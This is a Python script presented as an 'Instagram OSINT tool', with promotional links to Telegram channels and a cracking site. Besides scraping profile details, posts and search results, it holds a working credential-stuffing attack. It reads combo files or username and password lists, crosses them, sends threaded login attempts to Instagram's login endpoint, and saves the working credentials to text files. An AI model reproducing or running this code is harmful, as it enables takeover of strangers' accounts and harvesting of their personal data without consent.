#!/usr/bin/python3
# CODE BY darkboss1bd
# INSTAGRAM OSINT TOOL - REAL DATA

import os
import time
import sys
import requests
import json
import re
import threading
from urllib.parse import urlencode
from concurrent.futures import ThreadPoolExecutor, as_completed

# COLOR VARIABLES
BLACK = '\033[30m'
RED = '\033[1;31m'
GREEN = '\033[1;32m'
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
MAGENTA = '\033[1;35m'
CYAN = '\033[1;36m'
WHITE = '\033[1;37m'

def clear_screen():
    os.system('clear')

def display_banner():
    print(f"""{GREEN} 
     ██████╗ █████╗ ██████╗ ██╗  ██╗██████╗  ██████╗ ███████╗███████╗██████╗ 
    ██╔════╝██╔══██╗██╔══██╗██║ ██╔╝██╔══██╗██╔═══██╗██╔════╝██╔════╝██╔══██╗
    ██║     ███████║██████╔╝█████╔╝ ██████╔╝██║   ██║███████╗█████╗  ██████╔╝
    ██║     ██╔══██║██╔══██╗██╔═██╗ ██╔══██╗██║   ██║╚════██║██╔══╝  ██╔══██╗
    ╚██████╗██║  ██║██║  ██║██║  ██╗██████╔╝╚██████╔╝███████║███████╗██║  ██║
     ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝  ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝
    {WHITE}        I N S T A G R A M   O S I N T   B Y   darkboss1bd
    {CYAN}    Telegram: https://t.me/darkvaiadmin
    {CYAN}    Channel: https://t.me/windowspremiumkey
    {CYAN}    Website: https://crackyworld.com/
    """)

def loading_animation(message):
    for i in range(5):
        sys.stdout.write(f'\r       {WHITE}{message} {GREEN}|')
        time.sleep(0.1)
        sys.stdout.write(f'\r       {WHITE}{message} {GREEN}/')
        time.sleep(0.1)
        sys.stdout.write(f'\r       {WHITE}{message} {GREEN}-')
        time.sleep(0.1)
        sys.stdout.write(f'\r       {WHITE}{message} {GREEN}\\')
        time.sleep(0.1)
    print()

class InstagramOSINT:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        })
    
    def get_user_id(self, username):
        """Get user ID from username"""
        try:
            url = f"https://www.instagram.com/api/v1/users/web_profile_info/?username={username}"
            headers = {
                'X-IG-App-ID': '936619743392459',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
            }
            response = self.session.get(url, headers=headers)
            if response.status_code == 200:
                data = response.json()
                return data['data']['user']['id']
            return None
        except Exception as e:
            print(f"       {WHITE}[ {RED}! {WHITE}] {RED}Error getting user ID: {str(e)}")
            return None
    
    def get_user_info(self, username):
        """Get real Instagram user information"""
        try:
            print(f"\n       {WHITE}[ {GREEN}+ {WHITE}] {WHITE}Fetching real data for: {GREEN}{username}")
            loading_animation("CONNECTING TO INSTAGRAM")
            
            # Using Instagram's official API endpoint
            url = f"https://www.instagram.com/api/v1/users/web_profile_info/?username={username}"
            headers = {
                'X-IG-App-ID': '936619743392459',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
            }
            
            response = self.session.get(url, headers=headers)
            
            if response.status_code == 404:
                print(f"\n       {WHITE}[ {RED}! {WHITE}] {RED}User not found: {username}")
                return None
            elif response.status_code != 200:
                print(f"\n       {WHITE}[ {RED}! {WHITE}] {RED}Failed to fetch data. Status code: {response.status_code}")
                # Try alternative method
                return self.get_user_info_alternative(username)
            
            data = response.json()
            user = data['data']['user']
            
            user_info = {
                'username': user['username'],
                'full_name': user['full_name'],
                'userid': user['id'],
                'biography': user['biography'],
                'external_url': user['external_url'],
                'is_private': user['is_private'],
                'is_business_account': user['is_business_account'],
                'business_category_name': user.get('business_category_name', 'N/A'),
                'followers': user['edge_followed_by']['count'],
                'following': user['edge_follow']['count'],
                'mediacount': user['edge_owner_to_timeline_media']['count'],
                'profile_pic_url': user['profile_pic_url'],
                'is_verified': user['is_verified'],
                'connected_fb_page': user.get('connected_fb_page', 'N/A')
            }
            
            return user_info
            
        except Exception as e:
            print(f"\n       {WHITE}[ {RED}! {WHITE}] {RED}API Error: {str(e)}")
            # Try alternative method
            return self.get_user_info_alternative(username)
    
    def get_user_info_alternative(self, username):
        """Alternative method to get user info"""
        try:
            print(f"\n       {WHITE}[ {YELLOW}! {WHITE}] {YELLOW}Trying alternative method...")
            
            url = f"https://www.instagram.com/{username}/?__a=1&__d=1"
            response = self.session.get(url)
            
            if response.status_code == 200:
                # Try to parse JSON data
                try:
                    data = response.json()
                    user = data['graphql']['user']
                    
                    user_info = {
                        'username': user['username'],
                        'full_name': user['full_name'],
                        'userid': user['id'],
                        'biography': user['biography'],
                        'external_url': user['external_url'],
                        'is_private': user['is_private'],
                        'is_business_account': user['is_business_account'],
                        'business_category_name': user.get('business_category_name', 'N/A'),
                        'followers': user['edge_followed_by']['count'],
                        'following': user['edge_follow']['count'],
                        'mediacount': user['edge_owner_to_timeline_media']['count'],
                        'profile_pic_url': user['profile_pic_url_hd'] if user.get('profile_pic_url_hd') else user['profile_pic_url'],
                        'is_verified': user['is_verified'],
                        'connected_fb_page': user.get('connected_fb_page', 'N/A')
                    }
                    
                    return user_info
                except:
                    # If JSON parsing fails, try to extract from HTML
                    return self.extract_from_html(response.text, username)
            
            return None
            
        except Exception as e:
            print(f"\n       {WHITE}[ {RED}! {WHITE}] {RED}Alternative method failed: {str(e)}")
            return None
    
    def extract_from_html(self, html_content, username):
        """Extract user info from HTML content"""
        try:
            user_info = {
                'username': username,
                'full_name': 'N/A',
                'userid': 'N/A',
                'biography': 'N/A',
                'external_url': 'N/A',
                'is_private': 'Unknown',
                'is_business_account': 'Unknown',
                'business_category_name': 'N/A',
                'followers': 'N/A',
                'following': 'N/A',
                'mediacount': 'N/A',
                'profile_pic_url': 'N/A',
                'is_verified': 'Unknown',
                'connected_fb_page': 'N/A'
            }
            
            # Extract profile picture
            profile_pic_match = re.search(r'profile_pic_url_hd":"([^"]+)"', html_content)
            if profile_pic_match:
                user_info['profile_pic_url'] = profile_pic_match.group(1).replace('\\u0026', '&')
            
            # Extract full name
            full_name_match = re.search(r'full_name":"([^"]+)"', html_content)
            if full_name_match:
                user_info['full_name'] = full_name_match.group(1)
            
            # Extract biography
            bio_match = re.search(r'biography":"([^"]*)"', html_content)
            if bio_match:
                user_info['biography'] = bio_match.group(1)
            
            # Extract followers count
            followers_match = re.search(r'edge_followed_by":{"count":(\d+)}', html_content)
            if followers_match:
                user_info['followers'] = int(followers_match.group(1))
            
            # Extract following count
            following_match = re.search(r'edge_follow":{"count":(\d+)}', html_content)
            if following_match:
                user_info['following'] = int(following_match.group(1))
            
            # Extract media count
            media_match = re.search(r'edge_owner_to_timeline_media":{"count":(\d+)}', html_content)
            if media_match:
                user_info['mediacount'] = int(media_match.group(1))
            
            # Extract user ID
            id_match = re.search(r'"id":"(\d+)"', html_content)
            if id_match:
                user_info['userid'] = id_match.group(1)
            
            return user_info
            
        except Exception as e:
            print(f"\n       {WHITE}[ {RED}! {WHITE}] {RED}HTML extraction failed: {str(e)}")
            return None
    
    def get_user_posts(self, username):
        """Get user's recent posts"""
        try:
            url = f"https://www.instagram.com/api/v1/users/web_profile_info/?username={username}"
            headers = {
                'X-IG-App-ID': '936619743392459'
            }
            response = self.session.get(url, headers=headers)
            
            if response.status_code == 200:
                data = response.json()
                user = data['data']['user']
                posts = user['edge_owner_to_timeline_media']['edges']
                
                post_data = []
                for post in posts[:5]:  # Get first 5 posts
                    post_info = post['node']
                    post_data.append({
                        'id': post_info['id'],
                        'shortcode': post_info['shortcode'],
                        'caption': post_info['edge_media_to_caption']['edges'][0]['node']['text'] if post_info['edge_media_to_caption']['edges'] else 'No caption',
                        'likes': post_info['edge_media_preview_like']['count'],
                        'comments': post_info['edge_media_to_comment']['count'],
                        'timestamp': post_info['taken_at_timestamp'],
                        'is_video': post_info['is_video'],
                        'url': f"https://www.instagram.com/p/{post_info['shortcode']}/"
                    })
                
                return post_data
            return []
        except:
            return []
    
    def search_users(self, query):
        """Search for Instagram users"""
        try:
            url = f"https://www.instagram.com/web/search/topsearch/?query={query}"
            response = self.session.get(url)
            
            if response.status_code == 200:
                data = response.json()
                users = data['users']
                
                search_results = []
                for user in users[:10]:  # Get first 10 results
                    user_info = user['user']
                    search_results.append({
                        'username': user_info['username'],
                        'full_name': user_info['full_name'],
                        'is_verified': user_info['is_verified'],
                        'is_private': user_info['is_private'],
                        'profile_pic_url': user_info['profile_pic_url'],
                        'follower_count': user_info.get('follower_count', 0)
                    })
                
                return search_results
            return []
        except:
            return []

class InstagramAccountChecker:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        })
        self.checked_accounts = 0
        self.total_accounts = 0
    
    def check_single_account(self, username, password):
        """Check single Instagram account credentials"""
        try:
            # Instagram login API endpoint
            login_url = "https://www.instagram.com/accounts/login/ajax/"
            
            # First get CSRF token
            response = self.session.get("https://www.instagram.com/")
            csrf_token = None
            if 'csrftoken' in self.session.cookies:
                csrf_token = self.session.cookies['csrftoken']
            
            # Prepare login data
            login_data = {
                'username': username,
                'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:0:{password}',
                'queryParams': '{}',
                'optIntoOneTap': 'false'
            }
            
            headers = {
                'X-CSRFToken': csrf_token,
                'X-IG-App-ID': '936619743392459',
                'X-Requested-With': 'XMLHttpRequest',
                'Referer': 'https://www.instagram.com/',
                'Content-Type': 'application/x-www-form-urlencoded'
            }
            
            # Send login request
            response = self.session.post(login_url, data=login_data, headers=headers)
            
            if response.status_code == 200:
                result = response.json()
                
                if result.get('authenticated'):
                    return {
                        'username': username,
                        'password': password,
                        'status': 'VALID',
                        'message': 'Login successful',
                        'user_id': result.get('userId'),
                        'authenticated': True
                    }
                else:
                    error_message = result.get('message', 'Unknown error')
                    if 'checkpoint' in error_message.lower():
                        return {
                            'username': username,
                            'password': password,
                            'status': 'CHECKPOINT',
                            'message': 'Account requires verification (checkpoint)',
                            'authenticated': False
                        }
                    else:
                        return {
                            'username': username,
                            'password': password,
                            'status': 'INVALID',
                            'message': 'Invalid credentials',
                            'authenticated': False
                        }
            else:
                return {
                    'username': username,
                    'password': password,
                    'status': 'ERROR',
                    'message': f'HTTP Error: {response.status_code}',
                    'authenticated': False
                }
                
        except Exception as e:
            return {
                'username': username,
                'password': password,
                'status': 'ERROR',
                'message': f'Exception: {str(e)}',
                'authenticated': False
            }
    
    def check_accounts_from_combo_file(self, file_path):
        """Check multiple accounts from combo file (username:password format)"""
        try:
            if not os.path.exists(file_path):
                print(f"\n       {WHITE}[ {RED}! {WHITE}] {RED}File not found: {file_path}")
                return {}
            
            accounts = self.read_combo_file(file_path)
            if not accounts:
                return {}
            
            return self.process_accounts(accounts, "combo file")
            
        except Exception as e:
            print(f"\n       {WHITE}[ {RED}! {WHITE}] {RED}Error reading combo file: {str(e)}")
            return {}
    
    def check_accounts_from_separate_files(self, username_file, password_file):
        """Check accounts from separate username and password files"""
        try:
            if not os.path.exists(username_file):
                print(f"\n       {WHITE}[ {RED}! {WHITE}] {RED}Username file not found: {username_file}")
                return {}
            
            if not os.path.exists(password_file):
                print(f"\n       {WHITE}[ {RED}! {WHITE}] {RED}Password file not found: {password_file}")
                return {}
            
            # Read usernames
            with open(username_file, 'r', encoding='utf-8', errors='ignore') as f:
                usernames = [line.strip() for line in f if line.strip()]
            
            # Read passwords
            with open(password_file, 'r', encoding='utf-8', errors='ignore') as f:
                passwords = [line.strip() for line in f if line.strip()]
            
            if not usernames or not passwords:
                print(f"\n       {WHITE}[ {RED}! {WHITE}] {RED}No valid usernames or passwords found in files")
                return {}
            
            # Create account combinations
            accounts = []
            for username in usernames:
                for password in passwords:
                    accounts.append({'username': username, 'password': password})
            
            print(f"\n       {WHITE}[ {GREEN}+ {WHITE}] {WHITE}Created {GREEN}{len(accounts)}{WHITE} combinations from files")
            
            return self.process_accounts(accounts, "separate files")
            
        except Exception as e:
            print(f"\n       {WHITE}[ {RED}! {WHITE}] {RED}Error reading separate files: {str(e)}")
            return {}
    
    def read_combo_file(self, file_path):
        """Read combo file and extract username:password pairs"""
        accounts = []
        try:
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as file:
                for line_num, line in enumerate(file, 1):
                    line = line.strip()
                    if not line:
                        continue
                    
                    # Support multiple separators
                    if ':' in line:
                        parts = line.split(':', 1)
                    elif ';' in line:
                        parts = line.split(';', 1)
                    elif '|' in line:
                        parts = line.split('|', 1)
                    else:
                        continue
                    
                    if len(parts) == 2:
                        username = parts[0].strip()
                        password = parts[1].strip()
                        if username and password:
                            accounts.append({'username': username, 'password': password})
            
            return accounts
            
        except Exception as e:
            print(f"\n       {WHITE}[ {RED}! {WHITE}] {RED}Error parsing combo file: {str(e)}")
            return []
    
    def process_accounts(self, accounts, source_type):
        """Process accounts for checking"""
        valid_accounts = []
        checkpoint_accounts = []
        invalid_accounts = []
        
        total_accounts = len(accounts)
        self.total_accounts = total_accounts
        self.checked_accounts = 0
        
        print(f"\n       {WHITE}[ {GREEN}+ {WHITE}] {WHITE}Starting verification of {GREEN}{total_accounts}{WHITE} accounts from {source_type}")
        print(f"       {WHITE}[ {GREEN}+ {WHITE}] {WHITE}Press Ctrl+C to stop\n")
        
        # Use threading for faster checking
        with ThreadPoolExecutor(max_workers=5) as executor:
            future_to_account = {
                executor.submit(self.check_single_account, acc['username'], acc['password']): acc 
                for acc in accounts
            }
            
            try:
                for future in as_completed(future_to_account):
                    account = future_to_account[future]
                    try:
                        result = future.result()
                        self.checked_accounts += 1
                        
                        # Display result
                        if result['authenticated']:
                            print(f"       {WHITE}[{GREEN}{self.checked_accounts}/{total_accounts}{WHITE}] {GREEN}VALID {WHITE} {result['username']}:{result['password']}")
                            valid_accounts.append(result)
                        elif result['status'] == 'CHECKPOINT':
                            print(f"       {WHITE}[{GREEN}{self.checked_accounts}/{total_accounts}{WHITE}] {YELLOW}CHECKPOINT {WHITE} {result['username']}:{result['password']}")
                            checkpoint_accounts.append(result)
                        else:
                            print(f"       {WHITE}[{GREEN}{self.checked_accounts}/{total_accounts}{WHITE}] {RED}INVALID {WHITE} {result['username']}:{result['password']}")
                            invalid_accounts.append(result)
                        
                        # Small delay to avoid rate limiting
                        time.sleep(1)
                        
                    except Exception as e:
                        self.checked_accounts += 1
                        print(f"       {WHITE}[{GREEN}{self.checked_accounts}/{total_accounts}{WHITE}] {RED}ERROR {WHITE} {account['username']}:{account['password']} - {str(e)}")
            
            except KeyboardInterrupt:
                print(f"\n       {WHITE}[ {YELLOW}! {WHITE}] {YELLOW}Stopped by user")
                executor.shutdown(wait=False)
        
        return {
            'valid': valid_accounts,
            'checkpoint': checkpoint_accounts,
            'invalid': invalid_accounts
        }

def format_number(num):
    """Format numbers with commas"""
    if isinstance(num, int):
        return f"{num:,}"
    return str(num)

def display_user_info(user_info):
    """Display user information in formatted way"""
    print(f"\n       {WHITE}==================== {GREEN}ACCOUNT INFORMATION {WHITE}====================")
    print(f"\n       {WHITE}Username: {GREEN}{user_info['username']}")  
    print(f"       {WHITE}Full Name: {GREEN}{user_info['full_name']}")    
    print(f"       {WHITE}User ID: {GREEN}{user_info['userid']}")        
    print(f"       {WHITE}Bio: {GREEN}{user_info['biography']}")    
    if user_info['external_url'] and user_info['external_url'] != 'N/A':
        print(f"       {WHITE}External URL: {GREEN}{user_info['external_url']}")
    print(f"       {WHITE}Private Account: {GREEN}{'Yes' if user_info['is_private'] == True else 'No' if user_info['is_private'] == False else 'Unknown'}")
    print(f"       {WHITE}Verified Account: {GREEN}{'Yes' if user_info['is_verified'] == True else 'No' if user_info['is_verified'] == False else 'Unknown'}")
    print(f"       {WHITE}Business Account: {GREEN}{'Yes' if user_info['is_business_account'] == True else 'No' if user_info['is_business_account'] == False else 'Unknown'}")
    if user_info['is_business_account'] == True and user_info['business_category_name'] != 'N/A':
        print(f"       {WHITE}Business Category: {GREEN}{user_info['business_category_name']}")
    print(f"       {WHITE}Followers: {GREEN}{format_number(user_info['followers'])}")  
    print(f"       {WHITE}Following: {GREEN}{format_number(user_info['following'])}")   
    print(f"       {WHITE}Total Posts: {GREEN}{format_number(user_info['mediacount'])}")
    
    # Profile picture URL
    print(f"\n       {WHITE}[ {GREEN}+ {WHITE}]{WHITE} Profile Picture URL: ")
    print(f"       {GREEN}{user_info['profile_pic_url']}")

def display_posts(posts):
    """Display user's recent posts"""
    if posts:
        print(f"\n       {WHITE}[ {GREEN}+ {WHITE}]{WHITE} Recent Posts ({len(posts)}):")
        for i, post in enumerate(posts, 1):
            print(f"\n       {WHITE}Post {i}:")
            print(f"       {GREEN}URL: {WHITE}{post['url']}")
            print(f"       {GREEN}Likes: {WHITE}{format_number(post['likes'])}")
            print(f"       {GREEN}Comments: {WHITE}{format_number(post['comments'])}")
            caption_preview = post['caption'][:100] + "..." if len(post['caption']) > 100 else post['caption']
            print(f"       {GREEN}Caption: {WHITE}{caption_preview}")

def display_check_results(results):
    """Display account checking results"""
    valid_count = len(results.get('valid', []))
    checkpoint_count = len(results.get('checkpoint', []))
    invalid_count = len(results.get('invalid', []))
    
    print(f"\n       {WHITE}==================== {GREEN}CHECKING RESULTS {WHITE}====================")
    print(f"\n       {WHITE}Valid Accounts: {GREEN}{valid_count}")
    print(f"       {WHITE}Checkpoint Accounts: {YELLOW}{checkpoint_count}")
    print(f"       {WHITE}Invalid Accounts: {RED}{invalid_count}")
    
    if valid_count > 0:
        print(f"\n       {WHITE}[ {GREEN}+ {WHITE}]{WHITE} VALID ACCOUNTS:")
        for account in results['valid']:
            print(f"       {GREEN}✓ {account['username']}:{account['password']} - User ID: {account.get('user_id', 'N/A')}")
    
    if checkpoint_count > 0:
        print(f"\n       {WHITE}[ {YELLOW}! {WHITE}]{WHITE} CHECKPOINT ACCOUNTS (Require Verification):")
        for account in results['checkpoint']:
            print(f"       {YELLOW}⚠ {account['username']}:{account['password']}")
    
    # Save results to files
    timestamp = int(time.time())
    
    if valid_count > 0:
        filename = f"valid_accounts_{timestamp}.txt"
        with open(filename, 'w') as f:
            for account in results['valid']:
                f.write(f"{account['username']}:{account['password']}\n")
        print(f"\n       {WHITE}[ {GREEN}+ {WHITE}]{WHITE} Valid accounts saved to: {GREEN}{filename}")
    
    if checkpoint_count > 0:
        filename = f"checkpoint_accounts_{timestamp}.txt"
        with open(filename, 'w') as f:
            for account in results['checkpoint']:
                f.write(f"{account['username']}:{account['password']}\n")
        print(f"       {WHITE}[ {YELLOW}+ {WHITE}]{WHITE} Checkpoint accounts saved to: {YELLOW}{filename}")

def main():
    try:
        clear_screen()
        display_banner()
        
        print(f"\n                              {WHITE}[ {GREEN}! {WHITE}] INSTAGRAM OSINT TOOL")
        print(f"                              {WHITE}[ {GREEN}! {WHITE}] REAL DATA COLLECTION")
        
        instagram = InstagramOSINT()
        account_checker = InstagramAccountChecker()
        
        while True:
            print(f"\n       {WHITE}[ {GREEN}1{WHITE} ] Search User")
            print(f"       {WHITE}[ {GREEN}2{WHITE} ] User Information")
            print(f"       {WHITE}[ {GREEN}3{WHITE} ] Check Single Account")
            print(f"       {WHITE}[ {GREEN}4{WHITE} ] Check Combo File (username:password)")
            print(f"       {WHITE}[ {GREEN}5{WHITE} ] Check Separate Files (username.txt + password.txt)")
            print(f"       {WHITE}[ {GREEN}6{WHITE} ] Exit")
            
            choice = input(f"\n       [ {GREEN}+ {WHITE}] Select option: {RED}")
            
            if choice == '1':
                query = input(f"\n       [ {GREEN}+ {WHITE}] Enter search query: {RED}")
                if query:
                    results = instagram.search_users(query)
                    if results:
                        print(f"\n       {WHITE}[ {GREEN}+ {WHITE}]{WHITE} Search Results:")
                        for user in results:
                            verified = "✓" if user['is_verified'] else "✗"
                            private = "🔒" if user['is_private'] else "🔓"
                            print(f"       {GREEN}{verified}{private} {user['username']} - {user['full_name']} ({format_number(user['follower_count'])} followers)")
                    else:
                        print(f"\n       {WHITE}[ {RED}! {WHITE}] {RED}No results found")
            
            elif choice == '2':
                username = input(f"\n       [ {GREEN}+ {WHITE}] Enter Instagram username: {RED}")
                if username:
                    user_info = instagram.get_user_info(username)
                    if user_info:
                        display_user_info(user_info)
                        
                        # Get recent posts
                        if user_info['is_private'] != True:
                            posts = instagram.get_user_posts(username)
                            if posts:
                                display_posts(posts)
                            else:
                                print(f"\n       {WHITE}[ {YELLOW}! {WHITE}] {YELLOW}No posts found or account is private")
                        
                        print(f"\n       {WHITE}[ {GREEN}+ {WHITE}] {GREEN}Real data collection completed!")
                        print(f"       {WHITE}[ {GREEN}+ {WHITE}] {CYAN}Telegram: https://t.me/darkvaiadmin")
                        print(f"       {WHITE}[ {GREEN}+ {WHITE}] {CYAN}Channel: https://t.me/windowspremiumkey")
                        print(f"       {WHITE}[ {GREEN}+ {WHITE}] {CYAN}Website: https://crackyworld.com/")
                    else:
                        print(f"\n       {WHITE}[ {RED}! {WHITE}] {RED}Failed to fetch data for {username}")
            
            elif choice == '3':
                username = input(f"\n       [ {GREEN}+ {WHITE}] Enter username: {RED}")
                password = input(f"       [ {GREEN}+ {WHITE}] Enter password: {RED}")
                if username and password:
                    print(f"\n       {WHITE}[ {GREEN}+ {WHITE}] {WHITE}Checking account...")
                    result = account_checker.check_single_account(username, password)
                    if result['authenticated']:
                        print(f"\n       {WHITE}[ {GREEN}VALID {WHITE}] {GREEN}Account is valid! User ID: {result.get('user_id', 'N/A')}")
                    else:
                        print(f"\n       {WHITE}[ {RED}INVALID {WHITE}] {RED}{result['message']}")
            
            elif choice == '4':
                file_path = input(f"\n       [ {GREEN}+ {WHITE}] Enter combo file path: {RED}")
                if file_path:
                    print(f"\n       {WHITE}[ {GREEN}+ {WHITE}] {WHITE}Starting combo file verification...")
                    results = account_checker.check_accounts_from_combo_file(file_path)
                    display_check_results(results)
            
            elif choice == '5':
                username_file = input(f"\n       [ {GREEN}+ {WHITE}] Enter username file path: {RED}")
                password_file = input(f"       [ {GREEN}+ {WHITE}] Enter password file path: {RED}")
                if username_file and password_file:
                    print(f"\n       {WHITE}[ {GREEN}+ {WHITE}] {WHITE}Starting separate files verification...")
                    results = account_checker.check_accounts_from_separate_files(username_file, password_file)
                    display_check_results(results)
            
            elif choice == '6':
                print(f"\n       {WHITE}[ {YELLOW}! {WHITE}] {YELLOW}Thank you for using Instagram OSINT Tool!")
                break
            
            else:
                print(f"\n       {WHITE}[ {RED}! {WHITE}] {RED}Invalid choice!")
                
    except KeyboardInterrupt:
        print(f"\n {WHITE}[ {YELLOW}! {WHITE}] {YELLOW}Program stopped by user...")
    except Exception as e:
        print(f"\n {WHITE}[ {RED}! {WHITE}] {RED}Unexpected error: {str(e)}")

if __name__ == "__main__":
    main()
